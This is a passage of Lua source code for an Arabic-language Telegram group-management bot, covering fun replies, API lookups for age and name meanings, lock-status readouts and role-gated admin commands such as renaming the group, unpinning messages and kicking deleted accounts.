DevHmD:del(DevTwix..'nukjNsba:HmD'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
nukj = {'مرتبط 😂🤐','خاين 🤐🔥','ممرتبط 🌚💔','ابو نسوان 🥲♥️','زاحف 🙊💋','ميزحف 🙈💘','معدل هاذ 😘❤️',};
sendnukj = nukj[math.random(#nukj)]
local Text = "*☨︙*اليك النتائج الخـاصة  : \n\n*☨︙*عـزيزي نسبة ارتباط: *"..text.."*"
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ''..sendnukj..'' ,url="https://t.me/DevTwix"}},
{{text="• اخفاء الكشف •",callback_data="/HideHelpList:"..msg.sender_user_id_}}}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
DevHmD:del(DevTwix..'nukjNsba:HmD'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
---------------------------------------------------------------------------------------
if text == "تفعيل حساب العمر" and Manager(msg) and ChCheck(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙تم تفعيل حساب العمر بنجاح",'md')
DevHmD:del(DevTwix..'HmD:Age:HmD'..msg.chat_id_) 
end
if text == "تعطيل حساب العمر" and Manager(msg) and ChCheck(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙تم تعطيل حساب العمر بنجاح",'md')
DevHmD:set(DevTwix..'HmD:Age:HmD'..msg.chat_id_,true)  
end
if not DevHmD:get(DevTwix..'HmD:Age:HmD'..msg.chat_id_) then
if text and text:match("^احسب (.*)$") and ChCheck(msg) or text and text:match("^عمري (.*)$") and ChCheck(msg) then 
local TextAge = text:match("^احسب (.*)$") or text:match("^عمري (.*)$") 
UrlAge = https.request('https://apiabs.ml/age.php?age='..URL.escape(TextAge)) 
Age = JSON.decode(UrlAge) 
t = Age.ok.abs
Dev_HmD(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
end
---------------------------------------------------------------------------------------
if text == "تفعيل معاني الاسماء" and Manager(msg) and ChCheck(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙تم تفعيل امر معاني الاسماء",'md')
DevHmD:del(DevTwix..'HmD:Mean:HmD'..msg.chat_id_) 
end
if text == "تعطيل معاني الاسماء" and Manager(msg) and ChCheck(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙تم تعطيل امر معاني الاسماء",'md')
DevHmD:set(DevTwix..'HmD:Mean:HmD'..msg.chat_id_,true)  
end
if not DevHmD:get(DevTwix..'HmD:Mean:HmD'..msg.chat_id_) then
if text and text:match("^معنى الاسم (.*)$") and ChTwixDev(msg) or text and text:match("^معنى اسم (.*)$") and ChTwixDev(msg) then 
local TextMean = text:match("^معنى الاسم (.*)$") or text:match("^معنى اسم (.*)$") 
UrlMean = https.request('https://apiabs.ml/Mean.php?Abs='..URL.escape(TextMean)) 
Mean = JSON.decode(UrlMean) 
t = Mean.ok.abs
Dev_HmD(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
end
---------------------------------------------------------------------------------------
if text == "تفعيل غنيلي" and Manager(msg) and ChTwixDev(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙تم امر غنيلي بنجاح",'md')
DevHmD:del(DevTwix..'HmD:Audios:HmD'..msg.chat_id_) 
end
if text == "تعطيل غنيلي" and Manager(msg) and ChTwixDev(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙تم تعطيل امر غنيلي بنجاح",'md')
DevHmD:set(DevTwix..'HmD:Audios:HmD'..msg.chat_id_,true)  
end
if text == "غنيلي" then
data,res = https.request('https://black-source.tk/BlackTeAM/audios.php')
if res == 200 then
audios = json:decode(data)
if audios.Info == true then
local Text ='*: ﭑݪفِۅيسَ ، حِسب ذۅقيّ ♥️، .*'
keyboard = {}  
keyboard.inline_keyboard = {{{text = '᥀ TeaM Twix ˛',url="t.me/DevTwix"}},}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice='..URL.escape(audios.info)..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end end end
---------------------------------------------------------------------------------------
if Admin(msg) then
if DevHmD:get(DevTwix..'HmD:LockSettings'..msg.chat_id_) then 
if text == "الروابط" then if DevHmD:get(DevTwix..'HmD:Lock:Links'..msg.chat_id_) then mute_links = 'مقفله' else mute_links = 'مفتوحه' end local DevTwixTeam = "\n" .."⋄︙الروابط » "..mute_links.."\n" Dev_HmD(msg.chat_id_, msg.id_, 1, DevTwixTeam, 1, 'md') end
if text == "المعرف" or text == "المعرفات" then if DevHmD:get(DevTwix..'HmD:Lock:Tags'..msg.chat_id_) then lock_tag = 'مقفوله' else lock_tag = 'مفتوحه' end local DevTwixTeam = "\n" .."⋄︙المعرف » "..lock_tag.."\n" Dev_HmD(msg.chat_id_, msg.id_, 1, DevTwixTeam, 1, 'md') end
if text == "المتحركه" or text == "الملصقات المتحركه" then if DevHmD:get(DevTwix..'HmD:Lock:Gifs'..msg.chat_id_) then mute_gifs = 'مقفوله' else mute_gifs = 'مفتوحه' end local DevTwixTeam = "\n" .."⋄︙المتحركه » "..mute_gifs.."\n" Dev_HmD(msg.chat_id_, msg.id_, 1, DevTwixTeam, 1, 'md') end
if text == "الملصقات" then if DevHmD:get(DevTwix..'HmD:Lock:Stickers'..msg.chat_id_) then lock_sticker = 'مقفوله' else lock_sticker = 'مفتوحه' end local DevTwixTeam = "\n" .."⋄︙الملصقات » "..lock_sticker.."\n" Dev_HmD(msg.chat_id_, msg.id_, 1, DevTwixTeam, 1, 'md') end
if text == "الصور" then if DevHmD:get(DevTwix..'HmD:Lock:Photo'..msg.chat_id_) then mute_photo = 'مقفوله' else mute_photo = 'مفتوحه' end local DevTwixTeam = "\n" .."⋄︙الصور » "..mute_photo.."\n" Dev_HmD(msg.chat_id_, msg.id_, 1, DevTwixTeam, 1, 'md') end
if text == "الفيديو" or text == "الفيديوهات" then if DevHmD:get(DevTwix..'HmD:Lock:Videos'..msg.chat_id_) then mute_video = 'مقفوله' else mute_video = 'مفتوحه' end local DevTwixTeam = "\n" .."⋄︙الفيديو » "..mute_video.."\n" Dev_HmD(msg.chat_id_, msg.id_, 1, DevTwixTeam, 1, 'md') end
if text == "الاونلاين" then if DevHmD:get(DevTwix..'HmD:Lock:Inline'..msg.chat_id_) then mute_in = 'مقفل' else mute_in = 'مفتوح' end local DevTwixTeam = "\n" .."⋄︙الاونلاين » "..mute_in.."\n" Dev_HmD(msg.chat_id_, msg.id_, 1, DevTwixTeam, 1, 'md') end
if text == "الدردشه" then if DevHmD:get(DevTwix..'HmD:Lock:Text'..msg.chat_id_) then mute_text = 'مقفله' else mute_text = 'مفتوحه' end local DevTwixTeam = "\n" .."⋄︙الدردشه » "..mute_text.."\n" Dev_HmD(msg.chat_id_, msg.id_, 1, DevTwixTeam, 1, 'md') end
if text == "التوجيه" or text == "اعاده التوجيه" then if DevHmD:get(DevTwix..'HmD:Lock:Forwards'..msg.chat_id_) then lock_forward = 'مقفل' else lock_forward = 'مفتوح' end local DevTwixTeam = "\n" .."⋄︙التوجيه » "..lock_forward.."\n" Dev_HmD(msg.chat_id_, msg.id_, 1, DevTwixTeam, 1, 'md') end
if text == "الاغاني" then if DevHmD:get(DevTwix..'HmD:Lock:Music'..msg.chat_id_) then mute_music = 'مقفوله' else mute_music = 'مفتوحه' end local DevTwixTeam = "\n" .."⋄︙الاغاني » "..mute_music.."\n" Dev_HmD(msg.chat_id_, msg.id_, 1, DevTwixTeam, 1, 'md') end
if text == "الصوت" or text == "الصوتيات" then if DevHmD:get(DevTwix..'HmD:Lock:Voice'..msg.chat_id_) then mute_voice = 'مقفول' else mute_voice = 'مفتوح' end local DevTwixTeam = "\n" .."⋄︙الصوت » "..mute_voice.."\n" Dev_HmD(msg.chat_id_, msg.id_, 1, DevTwixTeam, 1, 'md') end
if text == "الجهات" or text == "جهات الاتصال" then if DevHmD:get(DevTwix..'HmD:Lock:Contact'..msg.chat_id_) then lock_contact = 'مقفوله' else lock_contact = 'مفتوحه' end local DevTwixTeam = "\n" .."⋄︙الجهات » "..lock_contact.."\n" Dev_HmD(msg.chat_id_, msg.id_, 1, DevTwixTeam, 1, 'md') end
if text == "الماركداون" then if DevHmD:get(DevTwix..'HmD:Lock:Markdown'..msg.chat_id_) then markdown = 'مقفل' else markdown = 'مفتوح' end local DevTwixTeam = "\n" .."⋄︙الماركداون » "..markdown.."\n" Dev_HmD(msg.chat_id_, msg.id_, 1, DevTwixTeam, 1, 'md') end
if text == "الهاشتاك" then if DevHmD:get(DevTwix..'HmD:Lock:Hashtak'..msg.chat_id_) then lock_htag = 'مقفل' else lock_htag = 'مفتوح' end local DevTwixTeam = "\n" .."⋄︙الهاشتاك » "..lock_htag.."\n"Dev_HmD(msg.chat_id_, msg.id_, 1, DevTwixTeam, 1, 'md') end
if text == "التعديل" then if DevHmD:get(DevTwix..'HmD:Lock:EditMsgs'..msg.chat_id_) then mute_edit = 'مقفل' else mute_edit = 'مفتوح' end local DevTwixTeam = "\n" .."⋄︙التعديل » "..mute_edit.."\n" Dev_HmD(msg.chat_id_, msg.id_, 1, DevTwixTeam, 1, 'md') end
if text == "التثبيت" then if DevHmD:get(DevTwix..'HmD:Lock:Pin'..msg.chat_id_) then lock_pin = 'مقفل' else lock_pin = 'مفتوح' end local DevTwixTeam = "\n" .."⋄︙التثبيت » "..lock_pin.."\n" Dev_HmD(msg.chat_id_, msg.id_, 1, DevTwixTeam, 1, 'md') end
if text == "الاشعارات" then if DevHmD:get(DevTwix..'HmD:Lock:TagServr'..msg.chat_id_) then lock_tgservice = 'مقفوله' else lock_tgservice = 'مفتوحه' end local DevTwixTeam = "\n" .."⋄︙الاشعارات » "..lock_tgservice.."\n" Dev_HmD(msg.chat_id_, msg.id_, 1, DevTwixTeam, 1, 'md') end
if text == "الكلايش" then if DevHmD:get(DevTwix..'HmD:Lock:Spam'..msg.chat_id_) then lock_spam = 'مقفوله' else lock_spam = 'مفتوحه' end local DevTwixTeam = "\n" .."⋄︙الكلايش » "..lock_spam.."\n" Dev_HmD(msg.chat_id_, msg.id_, 1, DevTwixTeam, 1, 'md') end
if text == "الدخول" then if DevHmD:get(DevTwix..'HmD:Lock:Join'..msg.chat_id_) then lock_Join = 'مقفول' else lock_Join = 'مفتوح' end local DevTwixTeam = "\n" .."⋄︙الدخول » "..lock_Join.."\n" Dev_HmD(msg.chat_id_, msg.id_, 1, DevTwixTeam, 1, 'md') end
if text == "الشبكات" then if DevHmD:get(DevTwix..'HmD:Lock:WebLinks'..msg.chat_id_) then lock_wp = 'مقفوله' else lock_wp = 'مفتوحه' end local DevTwixTeam = "\n" .."⋄︙الشبكات » "..lock_wp.."\n" Dev_HmD(msg.chat_id_, msg.id_, 1, DevTwixTeam, 1, 'md') end
if text == "المواقع" then if DevHmD:get(DevTwix..'HmD:Lock:Location'..msg.chat_id_) then lock_location = 'مقفوله' else lock_location = 'مفتوحه' end local DevTwixTeam = "\n" .."⋄︙المواقع » "..lock_location.."\n" Dev_HmD(msg.chat_id_, msg.id_, 1, DevTwixTeam, 1, 'md') end
if text == "العربيه" then if DevHmD:get(DevTwix..'HmD:Lock:Arabic'..msg.chat_id_) then lock_arabic = 'مقفوله' else lock_arabic = 'مفتوحه' end local DevTwixTeam = "\n" .."⋄︙العربيه » "..lock_arabic.."\n" Dev_HmD(msg.chat_id_, msg.id_, 1, DevTwixTeam, 1, 'md') end
if text == "الانكليزيه" then if DevHmD:get(DevTwix..'HmD:Lock:English'..msg.chat_id_) then lock_english = 'مقفوله' else lock_english = 'مفتوحه' end local DevTwixTeam = "\n" .."⋄︙الانكليزيه » "..lock_english.."\n" Dev_HmD(msg.chat_id_, msg.id_, 1, DevTwixTeam, 1, 'md') end
if text == "الكفر" then if DevHmD:get(DevTwix..'HmD:Lock:Kfr'..msg.chat_id_) then lock_kaf = 'مفتوح' else lock_kaf = 'مقفل' end local DevTwixTeam = "\n" .."⋄︙الكفر » "..lock_kaf.."\n" Dev_HmD(msg.chat_id_, msg.id_, 1, DevTwixTeam, 1, 'md') end
if text == "الفشار" then if DevHmD:get(DevTwix..'HmD:Lock:Fshar'..msg.chat_id_) then lock_fshar = 'مفتوح' else lock_fshar = 'مقفل' end local DevTwixTeam = "\n" .."⋄︙الفشار » "..lock_fshar.."\n" Dev_HmD(msg.chat_id_, msg.id_, 1, DevTwixTeam, 1, 'md') end
if text == "الطائفيه" then if DevHmD:get(DevTwix..'HmD:Lock:Taf'..msg.chat_id_) then lock_taf = 'مفتوحه' else lock_taf = 'مقفله' end local DevTwixTeam = "\n" .."⋄︙الطائفيه » "..lock_taf.."\n" Dev_HmD(msg.chat_id_, msg.id_, 1, DevTwixTeam, 1, 'md') end
end
---------------------------------------------------------------------------------------
if text == 'تفعيل كشف الاعدادات' and ChCheck(msg) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙تم تفعيل كشف الاعدادات",'md')
DevHmD:set(DevTwix..'HmD:LockSettings'..msg.chat_id_,true)  
end
if text == 'تعطيل كشف الاعدادات' and ChCheck(msg) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙تم تعطيل كشف الاعدادات",'md')
DevHmD:del(DevTwix..'HmD:LockSettings'..msg.chat_id_) 
end
---------------------------------------------------------------------------------------
if text and (text == 'تعطيل التحقق' or text == 'قفل التحقق' or text == 'تعطيل تنبيه الدخول') and Manager(msg) and ChCheck(msg) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙تم تعطيل التحقق من الاعضاء بنجاح",'md')
DevHmD:del(DevTwix..'HmD:Lock:Robot'..msg.chat_id_)
end
if text and (text == 'تفعيل التحقق' or text == 'فتح التحقق' or text == 'تفعيل تنبيه الدخول') and Manager(msg) and ChCheck(msg) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙تم تفعيل التحقق من الاعضاء  بنجاح",'md')
DevHmD:set(DevTwix..'HmD:Lock:Robot'..msg.chat_id_,true)
end
---------------------------------------------------------------------------------------
if text == 'تفعيل ردود المدير' and Manager(msg) and ChCheck(msg) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙تم تفعيل ردود المدير بنجاح",'md')
DevHmD:del(DevTwix..'HmD:Lock:GpRed'..msg.chat_id_)
end
if text == 'تعطيل ردود المدير' and Manager(msg) and ChCheck(msg) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙تم تعطيل ردود المدير بنجاح",'md')
DevHmD:set(DevTwix..'HmD:Lock:GpRed'..msg.chat_id_,true)
end
---------------------------------------------------------------------------------------
if text == 'تفعيل ردود المطور' and Manager(msg) and ChCheck(msg) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙تم تفعيل ردود المطور بنجاح",'md')
DevHmD:del(DevTwix..'HmD:Lock:AllRed'..msg.chat_id_)
end
if text == 'تعطيل ردود المطور' and Manager(msg) and ChCheck(msg) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙تم تعطسل ردود المطور بنجاح",'md')
DevHmD:set(DevTwix..'HmD:Lock:AllRed'..msg.chat_id_,true)
end
---------------------------------------------------------------------------------------
if HmDSudo(msg) then
if text == 'تفعيل المغادره' or text == '× تفعيل المغادرة ×' and ChCheck(msg) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙تم تفعيل المغادره بنجاح",'md')
DevHmD:del(DevTwix.."HmD:Left:Bot"..DevTwix)
end
if text == 'تعطيل المغادره' or text == '× تعطيل المغادرة ×' and ChCheck(msg) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙تم تعطيل المغادره بنجاح",'md')
DevHmD:set(DevTwix.."HmD:Left:Bot"..DevTwix,true) 
end 
if text == 'تفعيل الاذاعه' or text == '× تفعيل الاذاعة ×' and ChCheck(msg) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙تم تفعيل الاذاعة بنجاح",'md')
DevHmD:del(DevTwix.."HmD:Send:Bot"..DevTwix)
end
if text == 'تعطيل الاذاعه' or text == '× تعطيل الاذاعة ×' and ChCheck(msg) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙تم تعطيل الاذعة بنجاح",'md')
DevHmD:set(DevTwix.."HmD:Send:Bot"..DevTwix,true) 
end
end
---------------------------------------------------------------------------------------
if text and text:match("^ضع اسم (.*)$") and Manager(msg) and ChCheck(msg) then
local txt = {string.match(text, "^(ضع اسم) (.*)$")}
tdcli_function ({ ID = "ChangeChatTitle",chat_id_ = msg.chat_id_,title_ = txt[2] },function(arg,data) 
if data.message_ == "Channel chat title can be changed by administrators only" then
send(msg.chat_id_,msg.id_,"⋄︙البوت ليس ادمن يرجى ترقيتي !")  
return false  
end 
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"⋄︙ليست لدي صلاحية تغير معلومات المجموعه يرجى التحقق من الصلاحيات")  
else
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙تم تغيير اسم المجموعة بنجاح",'md')
end
end,nil) 
end
---------------------------------------------------------------------------------------
if msg.content_.photo_ then
if DevHmD:get(DevTwix..'HmD:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_) then
if msg.content_.photo_.sizes_[3] then
photo_id = msg.content_.photo_.sizes_[3].photo_.persistent_id_
else
photo_id = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
tdcli_function ({ID = "ChangeChatPhoto",chat_id_ = msg.chat_id_,photo_ = getInputFile(photo_id) }, function(arg,data)   
if data.code_ == 3 then
send(msg.chat_id_, msg.id_,"⋄︙عذرا البوت ليس ادمن يرجى ترقيتي والمحاوله لاحقا") 
DevHmD:del(DevTwix..'HmD:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
return false  end
if data.message_ == "CHAT_ADMIN_REQUIRED" then 
send(msg.chat_id_, msg.id_,"⋄︙ليست لدي صلاحية تغير معلومات المجموعه يرجى التحقق من الصلاحيات") 
DevHmD:del(DevTwix..'HmD:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
else
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙تم تغير صوره المجموعة بنجاح",'md')
end
end,nil) 
DevHmD:del(DevTwix..'HmD:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
end 
end
if text and text:match("^ضع صوره$") and ChCheck(msg) or text and text:match("^وضع صوره$") and ChCheck(msg) then
Dev_HmD(msg.chat_id_,msg.id_, 1, '⋄︙ارسل صورة المجموعه الان', 1, 'md')
DevHmD:set(DevTwix..'HmD:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
---------------------------------------------------------------------------------------
if text and text:match("^حذف الصوره$") and ChCheck(msg) or text and text:match("^مسح الصوره$") and ChCheck(msg) then
https.request("https://api.telegram.org/bot"..TokenBot.."/deleteChatPhoto?chat_id="..msg.chat_id_) 
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم حذف صورة المجموعه")  
return false  
end
---------------------------------------------------------------------------------------
if Manager(msg) then
if text and text:match("^الغاء تثبيت$") and ChCheck(msg) or text and text:match("^الغاء التثبيت$") and ChCheck(msg) then
if DevHmD:sismember(DevTwix.."HmD:Lock:Pinpin",msg.chat_id_) and not HMDicConstructor(msg) then
Dev_HmD(msg.chat_id_,msg.id_, 1, "⋄︙التثبيت والغاء واعادة التثبيت تم قفله من قبل المنشئين الاساسيين", 1, 'md')
return false  
end
tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
if data.ID == "Ok" then
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙تم الغاء تثبيت الرسالة بنجاح",'md')
HmDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevTwixTeam, 14, string.len(msg.sender_user_id_))
return false  
end
if data.code_ == 6 then
send(msg.chat_id_,msg.id_,"⋄︙انا لست ادمن هنا يرجى ترقيتي ادمن ثم اعد المحاوله")  
return false  
end
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"⋄︙ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات")  
return false  
end
end,nil)
end
---------------------------------------------------------------------------------------
if text and text:match("^الغاء تثبيت الكل$") and ChCheck(msg) then  
if DevHmD:sismember(DevTwix.."HmD:Lock:Pinpin",msg.chat_id_) and not HMDicConstructor(msg) then
Dev_HmD(msg.chat_id_,msg.id_, 1, "⋄︙التثبيت والغاء واعادة التثبيت تم قفله من قبل المنشئين الاساسيين", 1, 'md')
return false  
end
tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
if data.ID == "Ok" then
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙تم الغاء تثبيت الكل بنجاح",'md')
https.request('https://api.telegram.org/bot'..TokenBot..'/unpinAllChatMessages?chat_id='..msg.chat_id_)
DevHmD:del(DevTwix.."HmD:PinnedMsg"..msg.chat_id_)
return false  
end
if data.code_ == 6 then
send(msg.chat_id_,msg.id_,"⋄︙انا لست ادمن هنا يرجى ترقيتي ادمن ثم اعد المحاوله")  
return false  
end
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"⋄︙ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات")  
return false  
end
end,nil)
end
---------------------------------------------------------------------------------------
if text and text:match("^اعاده تثبيت$") and ChCheck(msg) or text and text:match("^اعاده التثبيت$") and ChCheck(msg) or text and text:match("^اعادة التثبيت$") and ChCheck(msg) then
if DevHmD:sismember(DevTwix.."HmD:Lock:Pinpin",msg.chat_id_) and not HMDicConstructor(msg) then
Dev_HmD(msg.chat_id_,msg.id_, 1, "⋄︙التثبيت والغاء واعادة التثبيت تم قفله من قبل المنشئين الاساسيين", 1, 'md')
return false  
end
local PinId = DevHmD:get(DevTwix..'HmD:PinnedMsg'..msg.chat_id_)
if PinId then
Pin(msg.chat_id_,PinId,0)
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙تم اعادة تثبيت الرسالة بنجاح",'md')
end end
end
---------------------------------------------------------------------------------------
if text == 'طرد المحذوفين' and ChCheck(msg) or text == 'مسح المحذوفين' and ChCheck(msg) or text == 'طرد الحسابات المحذوفه' and ChCheck(msg) or text == 'حذف المحذوفين' and ChCheck(msg) then  
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),offset_ = 0,limit_ = 1000}, function(arg,del)
for k, v in pairs(del.members_) do
tdcli_function({ID = "GetUser",user_id_ = v.user_id_},function(b,data) 
if data.first_name_ == false then
ChatKick(msg.chat_id_, data.id_)
end
end,nil)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم طرد المحذوفين")  
end,nil)
end
---------------------------------------------------------------------------------------
if text and text:match("^مسح المحظورين$") or text and text:match("^حذف المحظورين$") and ChCheck(msg) or text and text:match("^مسح المطرودين$") or text and text:match("^حذف المطرودين$") and ChCheck(msg) then
local function RemoveBlockList(extra, result)
if tonumber(result.total_count_) == 0 then 
Dev_HmD(msg.chat_id_, msg.id_, 0,'⋄︙*لا يوجد محظورين*', 1, 'md')
DevHmD:del(DevTwix..'HmD:Ban:'..msg.chat_id_)
else
local x = 0
for x,y in pairs(result.members_) do
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = y.user_id_, status_ = { ID = "ChatMemberStatusLeft" }, }, dl_cb, nil)
DevHmD:del(DevTwix..'HmD:Ban:'..msg.chat_id_)
x = x + 1
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم حذف المحظورين")  
end
end
tdcli_function({ID="GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersKicked"},offset_ = 0,limit_ = 200}, RemoveBlockList, {chat_id_ = msg.chat_id_, msg_id_ = msg.id_})    
end
end
---------------------------------------------------------------------------------------
if text and text:match("^معلومات المجموعه$") and ChCheck(msg) or text and text:match("^عدد الاعضاء$") and ChCheck(msg) or text and text:match("^عدد الكروب$") and ChCheck(msg) or text and text:match("^عدد الادمنيه$") and ChCheck(msg) or text and text:match("^عدد المحظورين$") and ChCheck(msg) then
local Muted = DevHmD:scard(DevTwix.."HmD:Muted:"..msg.chat_id_) or "0"
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙المجموعه » ❨ '..dp.title_..' ❩\n⋄︙الايدي » ❨ '..msg.chat_id_..' ❩\n⋄︙عدد الاعضاء » ❨ *'..data.member_count_..'* ❩\n⋄︙عدد الادمنيه » ❨ *'..data.administrator_count_..'* ❩\n⋄︙عدد المطرودين » ❨ *'..data.kicked_count_..'* ❩\n⋄︙عدد المكتومين » ❨ *'..Muted..'* ❩\n⋄︙عدد رسائل المجموعه » ❨ *'..(msg.id_/2097152/0.5)..'* ❩\n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n', 1, 'md') 
end,nil)
end,nil)
end
---------------------------------------------------------------------------------------
if text and text:match('^كشف (-%d+)') and ChCheck(msg) then
local ChatId = text:match('كشف (-%d+)') 
if not SudoBot(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙للمطورين فقط', 1, 'md')
else
local ConstructorList = DevHmD:scard(DevTwix.."HmD:Constructor:"..ChatId) or 0
local BanedList = DevHmD:scard(DevTwix.."HmD:Ban:"..ChatId) or 0
local ManagerList = DevHmD:scard(DevTwix.."HmD:Managers:"..ChatId) or 0
local MutedList = DevHmD:scard(DevTwix.."HmD:Muted:"..ChatId) or 0
local TkeedList = DevHmD:scard(DevTwix.."HmD:HmD:Tkeed:"..ChatId) or 0
local AdminsList = DevHmD:scard(DevTwix.."HmD:Admins:"..ChatId) or 0
local VipList = DevHmD:scard(DevTwix.."HmD:VipMem:"..ChatId) or 0
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..ChatId))
if LinkGp.ok == true then LinkGroup = LinkGp.result else LinkGroup = 't.me/DevTwix' end
tdcli_function({ID ="GetChat",chat_id_=ChatId},function(arg,dp)
tdcli_function ({ID = "GetChannelMembers",channel_id_ = ChatId:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
if dp.id_ then
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
Manager_id = admins[i].user_id_
tdcli_function ({ID = "GetUser",user_id_ = Manager_id},function(arg,HmD) 
if HmD.first_name_ ~= false then
ConstructorHmD = "["..HmD.first_name_.."](T.me/"..(HmD.username_ or "DevTwix")..")"
else 
ConstructorHmD = "حساب محذوف"
end
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙المجموعه » ["..dp.title_.."]("..LinkGroup..")\n⋄︙الايدي » ( `"..ChatId.."` )\n⋄︙المنشئ » "..ConstructorHmD.."\n⋄︙عدد المدراء » ( *"..ManagerList.."* )\n⋄︙عدد المنشئين » ( *"..ConstructorList.."* )\n⋄︙عدد الادمنيه » ( *"..AdminsList.."* )\n⋄︙عدد المميزين » ( *"..VipList.."* )\n⋄︙عدد المحظورين » ( *"..BanedList.."* )\n⋄︙عدد المقيدين » ( *"..TkeedList.."* )\n⋄︙عدد المكتومين » ( *"..MutedList.."* )", 1,"md")
end,nil)
end
end
else
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙لم تتم اضافتي بها لاقوم بكشفها", 1, "md")
end
end,nil)
end,nil)
end 
end
---------------------------------------------------------------------------------------
if text and text:match("^غادر (-%d+)$") and ChCheck(msg) then
local Text = { string.match(text, "^(غادر) (-%d+)$")}
if not SecondSudo(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙للمطور الاساسي فقط', 1, 'md')
else 
tdcli_function({ID ="GetChat",chat_id_=Text[2]},function(arg,dp) 
if dp.id_ then
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙المجموعه » ["..dp.title_.."]\n⋄︙تمت المغادره منها بنجاح", 1, "md")
Dev_HmD(Text[2], 0, 1, "⋄︙بامر المطور تم مغادرة هذه المجموعه ", 1, "md")  
ChatLeave(dp.id_, DevTwix)
DevHmD:srem(DevTwix.."HmD:Groups", dp.id_)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙لم تتم اضافتي بها لاقوم بمغادرتها", 1, "md")
end 
end,nil)
end 
end
---------------------------------------------------------------------------------------
if text and text:match("^تعين عدد الاعضاء (%d+)$") and SecondSudo(msg) or text and text:match("^تعيين عدد الاعضاء (%d+)$") and SecondSudo(msg) then
local Num = text:match("تعين عدد الاعضاء (%d+)$") or text:match("تعيين عدد الاعضاء (%d+)$")
DevHmD:set(DevTwix..'HmD:Num:Add:Bot',Num) 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم وضع عدد الاعضاء » *'..Num..'* عضو', 1, 'md')
end
---------------------------------------------------------------------------------------
if text == 'تفعيل البوت الخدمي' and ChCheck(msg) or text == '× تفعيل البوت خدمي ×' and ChCheck(msg) then 
if not HmDSudo(msg) then
